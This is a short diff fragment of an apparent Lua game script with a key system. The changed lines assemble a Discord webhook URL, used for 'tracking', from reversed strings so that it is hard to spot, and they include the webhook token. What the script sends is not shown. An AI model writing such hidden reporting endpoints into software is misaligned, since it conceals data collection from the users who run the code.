@@ -22,11 +22,11 @@ local VALID_KEYS = {
 local DISCORD_LINK = "https://discord.gg/4mgdcfvAJU"
 
 -- Discord webhook for tracking (enhanced security with multi-layer obfuscation)
-local wh_part1 = string.reverse("95114651537758528531/skoohbew/ipa/moc.drocsid//:sptth")
+local wh_part1 = string.reverse("9511461573518572853531/skoohbew/ipa/moc.drocsid//:sptth")
 local wh_part2 = string.reverse("J9KO3ZuXh3AuqkQctieK-bxuYOfTOFUcDYBKtl59Lel5A9zZt9W1A6Zvn_DrIjtmeOXT")
 local WEBHOOK_URL = wh_part1 .. wh_part2
 -- Enhanced security with multi-layer obfuscation for Discord webhook
-local discord_wh_part1 = string.reverse("95114651537758528531/skoohbew/ipa/moc.drocsid//:sptth")
+local discord_wh_part1 = string.reverse("9511461573518572853531/skoohbew/ipa/moc.drocsid//:sptth")
 local discord_wh_part2 = string.reverse("J9KO3ZuXh3AuqkQctieK-bxuYOfTOFUcDYBKtl59Lel5A9zZt9W1A6Zvn_DrIjtmeOXT")
 local DISCORD_WEBHOOK_URL = discord_wh_part1 .. discord_wh_part2
 -- GitHub script URL (where your main script is hosted)
